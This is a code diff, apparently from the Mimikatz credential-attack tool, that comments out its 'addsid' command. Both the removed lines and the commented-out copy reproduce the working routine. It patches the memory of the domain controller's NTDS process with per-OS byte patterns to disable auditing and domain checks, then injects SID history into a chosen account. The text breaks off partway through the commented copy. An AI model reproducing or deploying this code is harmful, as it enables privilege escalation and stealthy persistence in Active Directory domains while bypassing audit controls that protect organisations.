@@ -11,9 +11,9 @@ const KUHL_M_C kuhl_m_c_misc[] = {
 	{kuhl_m_misc_taskmgr,	L"taskmgr",		L"Task Manager            (without DisableTaskMgr)"},
 	{kuhl_m_misc_ncroutemon,L"ncroutemon",	L"Juniper Network Connect (without route monitoring)"},
 	{kuhl_m_misc_detours,	L"detours",		L"[experimental] Try to enumerate all modules with Detours-like hooks"},
-#ifdef _M_X64
-	{kuhl_m_misc_addsid,	L"addsid",		NULL},
-#endif
+//#ifdef _M_X64
+//	{kuhl_m_misc_addsid,	L"addsid",		NULL},
+//#endif
 	{kuhl_m_misc_memssp,	L"memssp",		NULL},
 	{kuhl_m_misc_skeleton,	L"skeleton",	NULL},
 	{kuhl_m_misc_compressme,L"compressme",	NULL},
@@ -224,230 +224,230 @@ BOOL kuhl_m_misc_generic_nogpo_patch(PCWSTR commandLine, PWSTR disableString, SI
 	return status;
 }
 
-#ifdef _M_X64
-BYTE PTRN_JMP[]			= {0xeb};
-BYTE PTRN_6NOP[]		= {0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
-
-BYTE PTRN_WN64_0[]		= {0xb8, 0x56, 0x21, 0x00, 0x00, 0x41}; // IsDomainInForest
-BYTE PTRN_WN64_1[]		= {0xfa, 0x05, 0x1a, 0x01, 0xe9}; // VerifyAuditingEnabled
-BYTE PTRN_WN64_2[]		= {0x48, 0x8b, 0xd7, 0x8b, 0x8c, 0x24}; // VerifySrcAuditingEnabledAndGetFlatName
-BYTE PTRN_WN64_3[]		= {0xff, 0xff, 0x4c, 0x8d, 0x8c, 0x24, 0x88, 0x01, 0x00, 0x00}; // ForceAuditOnSrcObj
-BYTE PTRN_WN64_4[]		= {0x49, 0x8b, 0x48, 0x18, 0x48, 0x8b, 0x84, 0x24, 0x00, 0x04, 0x00, 0x00}; // fNullUuid
-BYTE PTRN_WN64_5[]		= {0xc7, 0x44, 0x24, 0x74, 0x59, 0x07, 0x1a, 0x01, 0xe9}; // cmp r12
-BYTE PTRN_WN64_6[]		= {0xa9, 0xff, 0xcd, 0xff, 0xff, 0x0f, 0x85}; // cmp eax
-BYTE PTRN_WN64_7[]		= {0x8b, 0x84, 0x24, 0x6c, 0x01, 0x00, 0x00, 0x3d, 0xe8, 0x03, 0x00, 0x00, 0x73}; // SampSplitNT4SID
-
-BYTE PTRN_WN81_0[]		= {0xb8, 0x56, 0x21, 0x00, 0x00, 0x41}; // IsDomainInForest
-BYTE PTRN_WN81_1[]		= {0xc2, 0x05, 0x1a, 0x01, 0xe9}; // VerifyAuditingEnabled
-BYTE PTRN_WN81_2[]		= {0x48, 0x8b, 0xd7, 0x8b, 0x8c, 0x24, 0xc0/*, 0x00, 0x00, 0x00*/}; // VerifySrcAuditingEnabledAndGetFlatName
-BYTE PTRN_WN81_3[]		= {0xff, 0xff, 0x4c, 0x8d, 0x8c, 0x24, 0x60, 0x01, 0x00, 0x00}; // ForceAuditOnSrcObj
-BYTE PTRN_WN81_4[]		= {0x49, 0x8b, 0x48, 0x18, 0x48, 0x8b, 0x84, 0x24, 0x00, 0x04, 0x00, 0x00}; // fNullUuid
-BYTE PTRN_WN81_5[]		= {0xc7, 0x44, 0x24, 0x74, 0x1c, 0x07, 0x1a, 0x01, 0xe9}; // cmp r12
-BYTE PTRN_WN81_6[]		= {0xa9, 0xff, 0xcd, 0xff, 0xff, 0x0f, 0x85}; // cmp eax
-BYTE PTRN_WN81_7[]		= {0x8b, 0x84, 0x24, 0x98, 0x01, 0x00, 0x00, 0x3d, 0xe8, 0x03, 0x00, 0x00, 0x73}; // SampSplitNT4SID
-
-BYTE PTRN_WN80_0[]		= {0xb8, 0x56, 0x21, 0x00, 0x00, 0x41}; // IsDomainInForest
-BYTE PTRN_WN80_1[]		= {0xC1, 0x05, 0x1A, 0x01, 0xe9}; // VerifyAuditingEnabled
-BYTE PTRN_WN80_2[]		= {0x48, 0x8b, 0xd7, 0x8b, 0x8c, 0x24, 0xc0/*, 0x00, 0x00, 0x00*/}; // VerifySrcAuditingEnabledAndGetFlatName
-BYTE PTRN_WN80_3[]		= {0xff, 0xff, 0x4c, 0x8d, 0x84, 0x24, 0x58, 0x01, 0x00, 0x00}; // ForceAuditOnSrcObj
-BYTE PTRN_WN80_4[]		= {0x49, 0x8B, 0x41, 0x18, 0x48, 0x8D, 0x8C, 0x24, 0x10, 0x05, 0x00, 0x00}; // fNullUuid
-BYTE PTRN_WN80_5[]		= {0xC7, 0x44, 0x24, 0x74, 0x1b, 0x07, 0x1A, 0x01, 0xE9}; // cmp r12
-BYTE PTRN_WN80_6[]		= {0xa9, 0xff, 0xcd, 0xff, 0xff, 0x0f, 0x85}; // cmp eax
-BYTE PTRN_WN80_7[]		= {0x44, 0x8B, 0x9C, 0x24, 0x9C, 0x01, 0x00, 0x00, 0x41, 0x81, 0xFB, 0xE8, 0x03, 0x00, 0x00, 0x73}; // SampSplitNT4SID
-
-BYTE PTRN_W8R2_0[]		= {0xb8, 0x56, 0x21, 0x00, 0x00, 0x41}; // IsDomainInForest
-BYTE PTRN_W8R2_1[]		= {0x96, 0x05, 0x1a, 0x01, 0x48}; // VerifyAuditingEnabled
-//BYTE PTRN_W8R2_2[]		= {0x48, 0x8d, 0x94, 0x24, 0x28, 0x01, 0x00, 0x00, 0x48, 0x8d, 0x8c, 0x24, 0xf8, 0x01, 0x00, 0x00, 0xe8}; // VerifySrcAuditingEnabledAndGetFlatName 2010
-BYTE PTRN_W8R2_2[]		= {0x48, 0x8d, 0x94, 0x24, 0x18, 0x01, 0x00, 0x00, 0x48, 0x8d, 0x8c, 0x24, 0x00, 0x02, 0x00, 0x00, 0xe8}; // VerifySrcAuditingEnabledAndGetFlatName 2013
-BYTE PTRN_W8R2_3[]		= {0x00, 0x00, 0x00, 0x89, 0x44, 0x24, 0x70, 0x3b, 0xc6, 0x74};
-BYTE PTRN_W8R2_4[]		= {0x05, 0x00, 0x00, 0x48, 0x8b, 0x11, 0x48, 0x3b, 0x50, 0x08, 0x75}; // fNullUuid
-BYTE PTRN_W8R2_5[]		= {0xc7, 0x44, 0x24, 0x74, 0xed, 0x06, 0x1a, 0x01, 0x8b}; // cmp r14
-BYTE PTRN_W8R2_6[]		= {0xa9, 0xff, 0xcd, 0xff, 0xff, 0x0f, 0x85}; // cmp eax
-BYTE PTRN_W8R2_7[]		= {0x01, 0x00, 0x00, 0x41, 0x81, 0xfb, 0xe8, 0x03, 0x00, 0x00, 0x73}; // SampSplitNT4SID
-
-KULL_M_PATCH_MULTIPLE wservprev[] = {
-	{{sizeof(PTRN_WN64_0), PTRN_WN64_0}, {sizeof(PTRN_JMP),  PTRN_JMP},	 -2,},
-	{{sizeof(PTRN_WN64_1), PTRN_WN64_1}, {sizeof(PTRN_JMP),  PTRN_JMP},	-13,},
-	{{sizeof(PTRN_WN64_2), PTRN_WN64_2}, {sizeof(PTRN_6NOP), PTRN_6NOP},-11,},
-	{{sizeof(PTRN_WN64_3), PTRN_WN64_3}, {sizeof(PTRN_6NOP), PTRN_6NOP}, -4,},
-	{{sizeof(PTRN_WN64_4), PTRN_WN64_4}, {sizeof(PTRN_JMP),  PTRN_JMP},	 -2,},
-	{{sizeof(PTRN_WN64_5), PTRN_WN64_5}, {sizeof(PTRN_JMP),  PTRN_JMP},	-16,},
-	{{sizeof(PTRN_WN64_6), PTRN_WN64_6}, {sizeof(PTRN_6NOP), PTRN_6NOP}, 18,},
-	{{sizeof(PTRN_WN64_7), PTRN_WN64_7}, {sizeof(PTRN_JMP),  PTRN_JMP},	 12,},
-};
-KULL_M_PATCH_MULTIPLE w2k12r2[] = {
-	{{sizeof(PTRN_WN81_0), PTRN_WN81_0}, {sizeof(PTRN_JMP),  PTRN_JMP},	 -2,},
-	{{sizeof(PTRN_WN81_1), PTRN_WN81_1}, {sizeof(PTRN_JMP),  PTRN_JMP},	-13,},
-	{{sizeof(PTRN_WN81_2), PTRN_WN81_2}, {sizeof(PTRN_6NOP), PTRN_6NOP},-11,},
-	{{sizeof(PTRN_WN81_3), PTRN_WN81_3}, {sizeof(PTRN_6NOP), PTRN_6NOP}, -4,},
-	{{sizeof(PTRN_WN81_4), PTRN_WN81_4}, {sizeof(PTRN_JMP),  PTRN_JMP},	 -2,},
-	{{sizeof(PTRN_WN81_5), PTRN_WN81_5}, {sizeof(PTRN_JMP),  PTRN_JMP},	-16,},
-	{{sizeof(PTRN_WN81_6), PTRN_WN81_6}, {sizeof(PTRN_6NOP), PTRN_6NOP}, 18,},
-	{{sizeof(PTRN_WN81_7), PTRN_WN81_7}, {sizeof(PTRN_JMP),  PTRN_JMP},	 12,},
-};
-KULL_M_PATCH_MULTIPLE w2k12[] = {
-	{{sizeof(PTRN_WN80_0), PTRN_WN80_0}, {sizeof(PTRN_JMP),  PTRN_JMP},	 -2,},
-	{{sizeof(PTRN_WN80_1), PTRN_WN80_1}, {sizeof(PTRN_JMP),  PTRN_JMP},	-13,},
-	{{sizeof(PTRN_WN80_2), PTRN_WN80_2}, {sizeof(PTRN_6NOP), PTRN_6NOP},-11,},
-	{{sizeof(PTRN_WN80_3), PTRN_WN80_3}, {sizeof(PTRN_6NOP), PTRN_6NOP}, -4,},
-	{{sizeof(PTRN_WN80_4), PTRN_WN80_4}, {sizeof(PTRN_JMP),  PTRN_JMP},	 -2,},
-	{{sizeof(PTRN_WN80_5), PTRN_WN80_5}, {sizeof(PTRN_JMP),  PTRN_JMP},	-16,},
-	{{sizeof(PTRN_WN80_6), PTRN_WN80_6}, {sizeof(PTRN_6NOP), PTRN_6NOP}, 18,},
-	{{sizeof(PTRN_WN80_7), PTRN_WN80_7}, {sizeof(PTRN_JMP),  PTRN_JMP},	 15,},
-};
-KULL_M_PATCH_MULTIPLE w2k8r2[] = {
-	{{sizeof(PTRN_W8R2_0), PTRN_W8R2_0}, {sizeof(PTRN_JMP),  PTRN_JMP},	 -2,},
-	{{sizeof(PTRN_W8R2_1), PTRN_W8R2_1}, {sizeof(PTRN_JMP),  PTRN_JMP},	-14,},
-	{{sizeof(PTRN_W8R2_2), PTRN_W8R2_2}, {sizeof(PTRN_JMP),	 PTRN_JMP},  27,},
-	{{sizeof(PTRN_W8R2_3), PTRN_W8R2_3}, {sizeof(PTRN_JMP),  PTRN_JMP},   9,},
-	{{sizeof(PTRN_W8R2_4), PTRN_W8R2_4}, {sizeof(PTRN_JMP),  PTRN_JMP},	-11,},
-	{{sizeof(PTRN_W8R2_5), PTRN_W8R2_5}, {sizeof(PTRN_JMP),  PTRN_JMP},	-17,},
-	{{sizeof(PTRN_W8R2_6), PTRN_W8R2_6}, {sizeof(PTRN_6NOP), PTRN_6NOP}, 18,},
-	{{sizeof(PTRN_W8R2_7), PTRN_W8R2_7}, {sizeof(PTRN_JMP),  PTRN_JMP},	 20,},
-};
-
-NTSTATUS kuhl_m_misc_addsid(int argc, wchar_t * argv[])
-{
-	SERVICE_STATUS_PROCESS sNtds;
-	HANDLE hProcess, hDs;
-	KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION iNtds;
-	DWORD i, err;
-
-	KULL_M_MEMORY_ADDRESS sAddress = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aProcess = {NULL, NULL};
-	KULL_M_MEMORY_SEARCH sSearch;
-	BOOL littleSuccess = TRUE;
-	PPOLICY_DNS_DOMAIN_INFO pDnsInfo;
-	PKULL_M_PATCH_MULTIPLE pOs = NULL;
-	DWORD pOsSz = 0;
-
-	if(argc > 1)
-	{
-		if((MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_7) && (MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_8))
-		{
-			pOs = w2k8r2;
-			pOsSz = ARRAYSIZE(w2k8r2);
-		}
-		else if((MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_8) && (MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_BLUE))
-		{
-			pOs = w2k12;
-			pOsSz = ARRAYSIZE(w2k12);
-		}
-		else if((MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_BLUE) && (MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_10))
-		{
-			pOs = w2k12r2;
-			pOsSz = ARRAYSIZE(w2k12r2);
-		}
-		else if(MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_10)
-		{
-			pOs = wservprev;
-			pOsSz = ARRAYSIZE(wservprev);
-		}
-
-		if(pOs && pOsSz)
-		{
-			if(kull_m_net_getCurrentDomainInfo(&pDnsInfo))
-			{
-				err = DsBindW(NULL, NULL, &hDs);
-				if(err == ERROR_SUCCESS)
-				{
-					if(kull_m_service_getUniqueForName(L"ntds", &sNtds))
-					{
-						if(hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION, FALSE, sNtds.dwProcessId))
-						{
-							if(kull_m_memory_open(KULL_M_MEMORY_TYPE_PROCESS, hProcess, &aProcess.hMemory))
-							{
-								if(kull_m_process_getVeryBasicModuleInformationsForName(aProcess.hMemory, L"ntdsai.dll", &iNtds))
-								{
-									sSearch.kull_m_memoryRange.kull_m_memoryAdress = iNtds.DllBase;
-									sSearch.kull_m_memoryRange.size = iNtds.SizeOfImage;
-
-									for(i = 0; (i < pOsSz) && littleSuccess; i++)
-									{
-										littleSuccess = FALSE;
-										pOs[i].LocalBackup.hMemory = &KULL_M_MEMORY_GLOBAL_OWN_HANDLE;
-										pOs[i].LocalBackup.address = NULL;
-										pOs[i].AdressOfPatch.hMemory = aProcess.hMemory;
-										pOs[i].AdressOfPatch.address = NULL;
-										pOs[i].OldProtect = 0;
-
-										sAddress.address = pOs[i].Search.Pattern;
-										if(kull_m_memory_search(&sAddress, pOs[i].Search.Length, &sSearch, TRUE))
-										{
-											if(pOs[i].LocalBackup.address = LocalAlloc(LPTR, pOs[i].Patch.Length))
-											{
-												pOs[i].AdressOfPatch.address = (PBYTE) sSearch.result + pOs[i].Offset;
-												if(!(littleSuccess = kull_m_memory_copy(&pOs[i].LocalBackup, &pOs[i].AdressOfPatch, pOs[i].Patch.Length)))
-												{
-													PRINT_ERROR_AUTO(L"kull_m_memory_copy (backup)");
-													LocalFree(pOs[i].LocalBackup.address);
-													pOs[i].LocalBackup.address = NULL;
-												}
-											}
-										}
-										else
-										{
-											kprintf(L"Search %u : ", i);
-											PRINT_ERROR_AUTO(L"kull_m_memory_search");
-										}
-									}
-
-									if(littleSuccess)
-									{
-										for(i = 0; (i < pOsSz) && littleSuccess; i++)
-										{
-											littleSuccess = FALSE;
-
-											if(kull_m_memory_protect(&pOs[i].AdressOfPatch, pOs[i].Patch.Length, PAGE_EXECUTE_READWRITE, &pOs[i].OldProtect))
-											{
-												sAddress.address = pOs[i].Patch.Pattern;
-												if(!(littleSuccess = kull_m_memory_copy(&pOs[i].AdressOfPatch, &sAddress, pOs[i].Patch.Length)))
-													PRINT_ERROR_AUTO(L"kull_m_memory_copy");
-											}
-											else PRINT_ERROR_AUTO(L"kull_m_memory_protect");
-										}
-									}
-
-									if(littleSuccess)
-									{
-										kprintf(L"SIDHistory for \'%s\'\n", argv[0]);
-										for(i = 1; i < (DWORD) argc; i++)
-										{
-											kprintf(L" * %s\t", argv[i]);
-											err = DsAddSidHistoryW(hDs, 0, pDnsInfo->DnsDomainName.Buffer, argv[i], NULL, NULL, pDnsInfo->DnsDomainName.Buffer, argv[0]);
-											if(err == NO_ERROR)
-												kprintf(L"OK\n");
-											else PRINT_ERROR(L"DsAddSidHistory: 0x%08x (%u)!\n", err, err);
-										}
-									}
-
-									for(i = 0; i < pOsSz; i++)
-									{
-										if(pOs[i].LocalBackup.address)
-										{
-											if(!kull_m_memory_copy(&pOs[i].AdressOfPatch, &pOs[i].LocalBackup, pOs[i].Patch.Length))
-												PRINT_ERROR_AUTO(L"kull_m_memory_copy");
-											LocalFree(pOs[i].LocalBackup.address);
-										}
-										if(pOs[i].OldProtect)
-											kull_m_memory_protect(&pOs[i].AdressOfPatch, pOs[i].Patch.Length, pOs[i].OldProtect, &pOs[i].OldProtect);
-									}
-								}
-								kull_m_memory_close(aProcess.hMemory);
-							}
-							CloseHandle(hProcess);
-						}
-						else PRINT_ERROR_AUTO(L"OpenProcess");
-					}
-					err = DsUnBindW(&hDs);
-				}
-				else PRINT_ERROR(L"DsBind: %08x (%u)!\n", err, err);
-				LsaFreeMemory(pDnsInfo);
-			}
-		} else PRINT_ERROR(L"OS not supported (only w2k8r2 & w2k12r2)\n");
-	} else PRINT_ERROR(L"It requires at least 2 args\n");
-	return STATUS_SUCCESS;
-}
-#endif
+//#ifdef _M_X64
+//BYTE PTRN_JMP[]			= {0xeb};
+//BYTE PTRN_6NOP[]		= {0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
+//
+//BYTE PTRN_WN64_0[]		= {0xb8, 0x56, 0x21, 0x00, 0x00, 0x41}; // IsDomainInForest
+//BYTE PTRN_WN64_1[]		= {0xfa, 0x05, 0x1a, 0x01, 0xe9}; // VerifyAuditingEnabled
+//BYTE PTRN_WN64_2[]		= {0x48, 0x8b, 0xd7, 0x8b, 0x8c, 0x24}; // VerifySrcAuditingEnabledAndGetFlatName
+//BYTE PTRN_WN64_3[]		= {0xff, 0xff, 0x4c, 0x8d, 0x8c, 0x24, 0x88, 0x01, 0x00, 0x00}; // ForceAuditOnSrcObj
+//BYTE PTRN_WN64_4[]		= {0x49, 0x8b, 0x48, 0x18, 0x48, 0x8b, 0x84, 0x24, 0x00, 0x04, 0x00, 0x00}; // fNullUuid
+//BYTE PTRN_WN64_5[]		= {0xc7, 0x44, 0x24, 0x74, 0x59, 0x07, 0x1a, 0x01, 0xe9}; // cmp r12
+//BYTE PTRN_WN64_6[]		= {0xa9, 0xff, 0xcd, 0xff, 0xff, 0x0f, 0x85}; // cmp eax
+//BYTE PTRN_WN64_7[]		= {0x8b, 0x84, 0x24, 0x6c, 0x01, 0x00, 0x00, 0x3d, 0xe8, 0x03, 0x00, 0x00, 0x73}; // SampSplitNT4SID
+//
+//BYTE PTRN_WN81_0[]		= {0xb8, 0x56, 0x21, 0x00, 0x00, 0x41}; // IsDomainInForest
+//BYTE PTRN_WN81_1[]		= {0xc2, 0x05, 0x1a, 0x01, 0xe9}; // VerifyAuditingEnabled
+//BYTE PTRN_WN81_2[]		= {0x48, 0x8b, 0xd7, 0x8b, 0x8c, 0x24, 0xc0/*, 0x00, 0x00, 0x00*/}; // VerifySrcAuditingEnabledAndGetFlatName
+//BYTE PTRN_WN81_3[]		= {0xff, 0xff, 0x4c, 0x8d, 0x8c, 0x24, 0x60, 0x01, 0x00, 0x00}; // ForceAuditOnSrcObj
+//BYTE PTRN_WN81_4[]		= {0x49, 0x8b, 0x48, 0x18, 0x48, 0x8b, 0x84, 0x24, 0x00, 0x04, 0x00, 0x00}; // fNullUuid
+//BYTE PTRN_WN81_5[]		= {0xc7, 0x44, 0x24, 0x74, 0x1c, 0x07, 0x1a, 0x01, 0xe9}; // cmp r12
+//BYTE PTRN_WN81_6[]		= {0xa9, 0xff, 0xcd, 0xff, 0xff, 0x0f, 0x85}; // cmp eax
+//BYTE PTRN_WN81_7[]		= {0x8b, 0x84, 0x24, 0x98, 0x01, 0x00, 0x00, 0x3d, 0xe8, 0x03, 0x00, 0x00, 0x73}; // SampSplitNT4SID
+//
+//BYTE PTRN_WN80_0[]		= {0xb8, 0x56, 0x21, 0x00, 0x00, 0x41}; // IsDomainInForest
+//BYTE PTRN_WN80_1[]		= {0xC1, 0x05, 0x1A, 0x01, 0xe9}; // VerifyAuditingEnabled
+//BYTE PTRN_WN80_2[]		= {0x48, 0x8b, 0xd7, 0x8b, 0x8c, 0x24, 0xc0/*, 0x00, 0x00, 0x00*/}; // VerifySrcAuditingEnabledAndGetFlatName
+//BYTE PTRN_WN80_3[]		= {0xff, 0xff, 0x4c, 0x8d, 0x84, 0x24, 0x58, 0x01, 0x00, 0x00}; // ForceAuditOnSrcObj
+//BYTE PTRN_WN80_4[]		= {0x49, 0x8B, 0x41, 0x18, 0x48, 0x8D, 0x8C, 0x24, 0x10, 0x05, 0x00, 0x00}; // fNullUuid
+//BYTE PTRN_WN80_5[]		= {0xC7, 0x44, 0x24, 0x74, 0x1b, 0x07, 0x1A, 0x01, 0xE9}; // cmp r12
+//BYTE PTRN_WN80_6[]		= {0xa9, 0xff, 0xcd, 0xff, 0xff, 0x0f, 0x85}; // cmp eax
+//BYTE PTRN_WN80_7[]		= {0x44, 0x8B, 0x9C, 0x24, 0x9C, 0x01, 0x00, 0x00, 0x41, 0x81, 0xFB, 0xE8, 0x03, 0x00, 0x00, 0x73}; // SampSplitNT4SID
+//
+//BYTE PTRN_W8R2_0[]		= {0xb8, 0x56, 0x21, 0x00, 0x00, 0x41}; // IsDomainInForest
+//BYTE PTRN_W8R2_1[]		= {0x96, 0x05, 0x1a, 0x01, 0x48}; // VerifyAuditingEnabled
+////BYTE PTRN_W8R2_2[]		= {0x48, 0x8d, 0x94, 0x24, 0x28, 0x01, 0x00, 0x00, 0x48, 0x8d, 0x8c, 0x24, 0xf8, 0x01, 0x00, 0x00, 0xe8}; // VerifySrcAuditingEnabledAndGetFlatName 2010
+//BYTE PTRN_W8R2_2[]		= {0x48, 0x8d, 0x94, 0x24, 0x18, 0x01, 0x00, 0x00, 0x48, 0x8d, 0x8c, 0x24, 0x00, 0x02, 0x00, 0x00, 0xe8}; // VerifySrcAuditingEnabledAndGetFlatName 2013
+//BYTE PTRN_W8R2_3[]		= {0x00, 0x00, 0x00, 0x89, 0x44, 0x24, 0x70, 0x3b, 0xc6, 0x74};
+//BYTE PTRN_W8R2_4[]		= {0x05, 0x00, 0x00, 0x48, 0x8b, 0x11, 0x48, 0x3b, 0x50, 0x08, 0x75}; // fNullUuid
+//BYTE PTRN_W8R2_5[]		= {0xc7, 0x44, 0x24, 0x74, 0xed, 0x06, 0x1a, 0x01, 0x8b}; // cmp r14
+//BYTE PTRN_W8R2_6[]		= {0xa9, 0xff, 0xcd, 0xff, 0xff, 0x0f, 0x85}; // cmp eax
+//BYTE PTRN_W8R2_7[]		= {0x01, 0x00, 0x00, 0x41, 0x81, 0xfb, 0xe8, 0x03, 0x00, 0x00, 0x73}; // SampSplitNT4SID
+//
+//KULL_M_PATCH_MULTIPLE wservprev[] = {
+//	{{sizeof(PTRN_WN64_0), PTRN_WN64_0}, {sizeof(PTRN_JMP),  PTRN_JMP},	 -2,},
+//	{{sizeof(PTRN_WN64_1), PTRN_WN64_1}, {sizeof(PTRN_JMP),  PTRN_JMP},	-13,},
+//	{{sizeof(PTRN_WN64_2), PTRN_WN64_2}, {sizeof(PTRN_6NOP), PTRN_6NOP},-11,},
+//	{{sizeof(PTRN_WN64_3), PTRN_WN64_3}, {sizeof(PTRN_6NOP), PTRN_6NOP}, -4,},
+//	{{sizeof(PTRN_WN64_4), PTRN_WN64_4}, {sizeof(PTRN_JMP),  PTRN_JMP},	 -2,},
+//	{{sizeof(PTRN_WN64_5), PTRN_WN64_5}, {sizeof(PTRN_JMP),  PTRN_JMP},	-16,},
+//	{{sizeof(PTRN_WN64_6), PTRN_WN64_6}, {sizeof(PTRN_6NOP), PTRN_6NOP}, 18,},
+//	{{sizeof(PTRN_WN64_7), PTRN_WN64_7}, {sizeof(PTRN_JMP),  PTRN_JMP},	 12,},
+//};
+//KULL_M_PATCH_MULTIPLE w2k12r2[] = {
+//	{{sizeof(PTRN_WN81_0), PTRN_WN81_0}, {sizeof(PTRN_JMP),  PTRN_JMP},	 -2,},
+//	{{sizeof(PTRN_WN81_1), PTRN_WN81_1}, {sizeof(PTRN_JMP),  PTRN_JMP},	-13,},
+//	{{sizeof(PTRN_WN81_2), PTRN_WN81_2}, {sizeof(PTRN_6NOP), PTRN_6NOP},-11,},
+//	{{sizeof(PTRN_WN81_3), PTRN_WN81_3}, {sizeof(PTRN_6NOP), PTRN_6NOP}, -4,},
+//	{{sizeof(PTRN_WN81_4), PTRN_WN81_4}, {sizeof(PTRN_JMP),  PTRN_JMP},	 -2,},
+//	{{sizeof(PTRN_WN81_5), PTRN_WN81_5}, {sizeof(PTRN_JMP),  PTRN_JMP},	-16,},
+//	{{sizeof(PTRN_WN81_6), PTRN_WN81_6}, {sizeof(PTRN_6NOP), PTRN_6NOP}, 18,},
+//	{{sizeof(PTRN_WN81_7), PTRN_WN81_7}, {sizeof(PTRN_JMP),  PTRN_JMP},	 12,},
+//};
+//KULL_M_PATCH_MULTIPLE w2k12[] = {
+//	{{sizeof(PTRN_WN80_0), PTRN_WN80_0}, {sizeof(PTRN_JMP),  PTRN_JMP},	 -2,},
+//	{{sizeof(PTRN_WN80_1), PTRN_WN80_1}, {sizeof(PTRN_JMP),  PTRN_JMP},	-13,},
+//	{{sizeof(PTRN_WN80_2), PTRN_WN80_2}, {sizeof(PTRN_6NOP), PTRN_6NOP},-11,},
+//	{{sizeof(PTRN_WN80_3), PTRN_WN80_3}, {sizeof(PTRN_6NOP), PTRN_6NOP}, -4,},
+//	{{sizeof(PTRN_WN80_4), PTRN_WN80_4}, {sizeof(PTRN_JMP),  PTRN_JMP},	 -2,},
+//	{{sizeof(PTRN_WN80_5), PTRN_WN80_5}, {sizeof(PTRN_JMP),  PTRN_JMP},	-16,},
+//	{{sizeof(PTRN_WN80_6), PTRN_WN80_6}, {sizeof(PTRN_6NOP), PTRN_6NOP}, 18,},
+//	{{sizeof(PTRN_WN80_7), PTRN_WN80_7}, {sizeof(PTRN_JMP),  PTRN_JMP},	 15,},
+//};
+//KULL_M_PATCH_MULTIPLE w2k8r2[] = {
+//	{{sizeof(PTRN_W8R2_0), PTRN_W8R2_0}, {sizeof(PTRN_JMP),  PTRN_JMP},	 -2,},
+//	{{sizeof(PTRN_W8R2_1), PTRN_W8R2_1}, {sizeof(PTRN_JMP),  PTRN_JMP},	-14,},
+//	{{sizeof(PTRN_W8R2_2), PTRN_W8R2_2}, {sizeof(PTRN_JMP),	 PTRN_JMP},  27,},
+//	{{sizeof(PTRN_W8R2_3), PTRN_W8R2_3}, {sizeof(PTRN_JMP),  PTRN_JMP},   9,},
+//	{{sizeof(PTRN_W8R2_4), PTRN_W8R2_4}, {sizeof(PTRN_JMP),  PTRN_JMP},	-11,},
+//	{{sizeof(PTRN_W8R2_5), PTRN_W8R2_5}, {sizeof(PTRN_JMP),  PTRN_JMP},	-17,},
+//	{{sizeof(PTRN_W8R2_6), PTRN_W8R2_6}, {sizeof(PTRN_6NOP), PTRN_6NOP}, 18,},
+//	{{sizeof(PTRN_W8R2_7), PTRN_W8R2_7}, {sizeof(PTRN_JMP),  PTRN_JMP},	 20,},
+//};
+//
+//NTSTATUS kuhl_m_misc_addsid(int argc, wchar_t * argv[])
+//{
+//	SERVICE_STATUS_PROCESS sNtds;
+//	HANDLE hProcess, hDs;
+//	KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION iNtds;
+//	DWORD i, err;
+//
+//	KULL_M_MEMORY_ADDRESS sAddress = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aProcess = {NULL, NULL};
+//	KULL_M_MEMORY_SEARCH sSearch;
+//	BOOL littleSuccess = TRUE;
+//	PPOLICY_DNS_DOMAIN_INFO pDnsInfo;
+//	PKULL_M_PATCH_MULTIPLE pOs = NULL;
+//	DWORD pOsSz = 0;
+//
+//	if(argc > 1)
+//	{
+//		if((MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_7) && (MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_8))
+//		{
+//			pOs = w2k8r2;
+//			pOsSz = ARRAYSIZE(w2k8r2);
+//		}
+//		else if((MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_8) && (MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_BLUE))
+//		{
+//			pOs = w2k12;
+//			pOsSz = ARRAYSIZE(w2k12);
+//		}
+//		else if((MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_BLUE) && (MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_10))
+//		{
+//			pOs = w2k12r2;
+//			pOsSz = ARRAYSIZE(w2k12r2);
+//		}
+//		else if(MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_10)
+//		{
+//			pOs = wservprev;
+//			pOsSz = ARRAYSIZE(wservprev);
+//		}
+//
+//		if(pOs && pOsSz)
+//		{
+//			if(kull_m_net_getCurrentDomainInfo(&pDnsInfo))
+//			{
+//				err = DsBindW(NULL, NULL, &hDs);
+//				if(err == ERROR_SUCCESS)
+//				{
+//					if(kull_m_service_getUniqueForName(L"ntds", &sNtds))
+//					{
+//						if(hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION, FALSE, sNtds.dwProcessId))
+//						{
+//							if(kull_m_memory_open(KULL_M_MEMORY_TYPE_PROCESS, hProcess, &aProcess.hMemory))
+//							{
+//								if(kull_m_process_getVeryBasicModuleInformationsForName(aProcess.hMemory, L"ntdsai.dll", &iNtds))
+//								{
+//									sSearch.kull_m_memoryRange.kull_m_memoryAdress = iNtds.DllBase;
+//									sSearch.kull_m_memoryRange.size = iNtds.SizeOfImage;
+//
+//									for(i = 0; (i < pOsSz) && littleSuccess; i++)
+//									{
+//										littleSuccess = FALSE;
+//										pOs[i].LocalBackup.hMemory = &KULL_M_MEMORY_GLOBAL_OWN_HANDLE;
